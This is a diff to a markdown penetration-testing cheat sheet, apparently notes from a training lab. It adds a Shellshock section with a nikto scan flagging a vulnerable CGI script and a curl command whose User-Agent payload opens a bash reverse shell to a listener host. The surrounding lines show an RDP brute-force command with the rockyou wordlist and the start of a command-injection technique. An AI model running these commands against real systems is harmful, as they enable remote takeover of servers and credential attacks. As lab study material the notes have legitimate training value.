@@ -89,6 +89,16 @@ crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
 
 
 ## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
+### Shellshock
+````
+nikto -ask=no -h http://10.11.1.71:80 2>&1
+OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability
+````
+````
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
+http://10.11.1.71:80/cgi-bin/admin.cgi
+````
+
 ### Command Injection
 #### DNS Querying Service
 For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:
